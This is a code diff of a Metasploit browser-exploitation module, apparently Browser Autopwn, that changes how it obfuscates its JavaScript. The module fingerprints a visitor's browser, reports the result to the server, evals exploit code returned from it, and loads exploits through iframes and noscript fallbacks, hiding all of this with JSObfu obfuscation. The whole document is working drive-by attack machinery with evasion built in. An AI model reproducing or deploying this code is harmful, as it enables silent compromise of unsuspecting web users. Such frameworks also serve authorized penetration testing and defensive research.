@@ -16,7 +16,7 @@
 
 require 'msf/core'
 require 'rex/exploitation/javascriptosdetect'
-
+require 'rex/exploitation/jsobfu'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -142,6 +142,7 @@ class Metasploit3 < Msf::Auxiliary
 	def cmd_list(*args)
 		print_status("Listing Browser Autopwn exploits:")
 		print_line
+		@exploits = {}
 		each_autopwn_module do |name, mod|
 			@exploits[name] = nil
 			print_line name
@@ -174,10 +175,8 @@ class Metasploit3 < Msf::Auxiliary
 
 	def setup
 
-		@init_js = ::Rex::Exploitation::ObfuscateJS.new
-		@init_js << <<-ENDJS
+		@init_js = ::Rex::Exploitation::JavascriptOSDetect.new <<-ENDJS
 
-			#{js_os_detect}
 			#{js_base64}
 
 			function make_xhr() {
@@ -202,6 +201,10 @@ class Metasploit3 < Msf::Auxiliary
 				xhr = make_xhr();
 				xhr.onreadystatechange = function () {
 					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
+						//var ta = document.createElement("textarea");
+						//ta.rows = ta.cols = 100;
+						//ta.value = xhr.responseText;
+						//document.body.appendChild(ta)
 						eval(xhr.responseText);
 					}
 				};
@@ -212,7 +215,7 @@ class Metasploit3 < Msf::Auxiliary
 					#{js_debug('prop + " " + detected_version[prop] +"<br>"')}
 					encoded_detection += detected_version[prop] + ":";
 				}
-				//#{js_debug('encoded_detection + "<br>"')}
+				#{js_debug('"<br>"')}
 				encoded_detection = Base64.encode(encoded_detection);
 				xhr.open("GET", document.location + "?sessid=" + encoded_detection);
 				xhr.send(null);
@@ -225,24 +228,6 @@ class Metasploit3 < Msf::Auxiliary
 			} // function bodyOnLoad
 		ENDJS
 
-		opts = {
-			'Symbols' => {
-				'Variables'   => [
-					'xhr',
-					'encoded_detection',
-				],
-				'Methods'   => [
-					'report_and_get_exploits',
-					'handler',
-					'bodyOnLoad',
-				]
-			},
-			'Strings' => true,
-		}
-
-		@init_js.update_opts(opts)
-		@init_js.update_opts(js_os_detect.opts)
-		@init_js.update_opts(js_base64.opts)
 		if (datastore['DEBUG'])
 			print_status("Adding debug code")
 			@init_js << <<-ENDJS
@@ -259,7 +244,7 @@ class Metasploit3 < Msf::Auxiliary
 				}
 			ENDJS
 		else
-			@init_js.obfuscate()
+			@init_js.obfuscate
 		end
 
 		#@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
@@ -449,14 +434,15 @@ class Metasploit3 < Msf::Auxiliary
 			# If the exploit supplies a min/max version, build up a test to
 			# check for the proper version.  Note: The version comparison
 			# functions come from javascriptosdetect.
+			js_d_ver = @init_js.sym("detected_version")
 			if apo[:ua_minver] and apo[:ua_maxver]
 				ver_test =
-						"!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}') && " +
-						"!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')"
+						"!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}') && " +
+						"!#{@init_js.sym("ua_ver_gt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')"
 			elsif apo[:ua_minver]
-				ver_test = "!ua_ver_lt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_minver]}')\n"
+				ver_test = "!#{@init_js.sym("ua_ver_lt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_minver]}')\n"
 			elsif apo[:ua_maxver]
-				ver_test = "!ua_ver_gt(detected_version.#{@init_js.sym("ua_version")}, '#{apo[:ua_maxver]}')\n"
+				ver_test = "!#{@init_js.sym("ua_ver_gt")}(#{js_d_ver}['ua_version'], '#{apo[:ua_maxver]}')\n"
 			else
 				ver_test = nil
 			end
@@ -560,7 +546,7 @@ class Metasploit3 < Msf::Auxiliary
 			record_detection(cli, request)
 			if (action.name == "DefangedDetection")
 				response = create_response()
-				response.body = "Please wait"
+				response.body = "#{js_debug("'Please wait'")}"
 			else
 				print_status("Responding with exploits")
 				response = build_script_response(cli, request)
@@ -655,7 +641,7 @@ class Metasploit3 < Msf::Auxiliary
 		client_info = get_client(:host => cli.peerhost, :ua_string => request['User-Agent'])
 		#print_status("Client info: #{client_info.inspect}")
 
-		js = ::Rex::Exploitation::ObfuscateJS.new
+		js = "var global_exploit_list = []\n";
 		# If we didn't get a client from the database, then the detection
 		# is borked or the db is not connected, so fallback to sending
 		# some IE-specific stuff with everything.  Do the same if the
@@ -750,29 +736,8 @@ class Metasploit3 < Msf::Auxiliary
 					next_exploit(exploit_idx+1);
 				};
 			}
-			window.next_exploit = next_exploit;
 		ENDJS
-		opts = {
-			'Symbols' => {
-				'Variables'   => [
-					'written_iframes',
-					'myframe',
-					'mybody',
-					'iframe_idx',
-					'is_vuln',
-					'global_exploit_list',
-					'exploit_idx',
-				],
-				'Methods'   => [
-					'write_iframe',
-					'next_exploit',
-				]
-			},
-			'Strings' => true,
-		}
 
-		# Prepare all of the tests for next_exploit to loop through
-		js << "var global_exploit_list = []\n";
 		# if we have no client_info, this will add all tests. Otherwise tries
 		# to only send tests for exploits that target the client's detected
 		# browser.
@@ -829,24 +794,22 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 		}
-		js << "#{js_debug("'starting exploits<br>'")}\n"
-		js << "next_exploit(0);\n"
 
 		# If all of our exploits that require javascript fail, try to continue
 		# with those that don't
 		js << %Q|var noscript_exploits = "|
 		js << Rex::Text.to_hex(noscript_html, "%")
 		js << %Q|";\n|
-		js << %Q|noscript_div = document.createElement("div");\n|
+		js << %Q|var noscript_div = document.createElement("div");\n|
 		js << %Q|noscript_div.innerHTML = unescape(noscript_exploits);\n|
 		js << %Q|document.body.appendChild(noscript_div);\n|
 
-		opts['Symbols']['Methods'].push("noscript_exploits")
-		opts['Symbols']['Methods'].push("noscript_div")
+		js << "#{js_debug("'starting exploits<br>'")}\n"
+		js << "next_exploit(0);\n"
 
-		if not datastore['DEBUG']
-			js.obfuscate
-		end
+		js = ::Rex::Exploitation::JSObfu.new(js)
+		js.obfuscate
+
 		response.body = "#{js}"
 
 		return response
